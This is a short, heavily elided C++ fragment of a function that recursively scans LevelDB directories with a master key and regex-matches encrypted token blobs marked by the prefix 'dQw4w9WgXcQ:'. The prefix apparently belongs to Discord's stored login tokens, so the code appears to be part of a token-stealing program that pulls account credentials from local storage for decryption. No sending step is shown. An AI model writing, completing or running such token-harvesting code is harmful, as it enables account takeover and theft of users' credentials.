...
void scanLevelDB(const std::string& dir, const std::vector<uint8_t>& masterKey) {
        // matches encrypted token blob after "dQw4w9WgXcQ:" prefix
        ...
        for (auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
                ...
                for (auto it = begin; it != std::sregex_iterator(); ++it) {
                        ...
                        std::string b64 = match.substr(12);  // strip "dQw4w9WgXcQ:"
